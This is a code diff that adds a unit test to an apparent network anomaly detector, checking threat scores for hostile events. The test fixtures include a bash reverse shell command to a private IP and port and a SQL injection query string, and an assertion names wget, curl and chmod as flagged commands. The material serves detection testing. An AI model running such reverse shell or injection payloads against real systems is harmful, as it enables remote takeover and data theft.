@@ -146,6 +146,26 @@ class AnomalyTests(unittest.TestCase):
         self.assertEqual(res["threat_level"], "CRITICAL")
         self.assertEqual(res["threat_score"], 100)
 
+    def test_reverse_shell_and_sqli_detection(self):
+        ip = "192.0.2.10"
+        analyze_event({
+            "src_ip": ip,
+            "event_type": "command",
+            "payload": {"command": "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"},
+            "protocol": "SSH"
+        })
+        res = get_threat_score(ip)
+        self.assertEqual(res["threat_level"], "MEDIUM")
+        self.assertEqual(res["threat_score"], 30)
+
+        analyze_event({
+            "src_ip": ip,
+            "event_type": "request",
+            "payload": {"path": "/login", "query": "id=1 UNION SELECT 1,2,3--"},
+            "protocol": "HTTP"
+        })
+        res2 = get_threat_score(ip)
+        self.assertIn("Flagged high-risk commands (e.g. wget, curl, chmod)", res2["reasons"])
 
 
 if __name__ == "__main__":
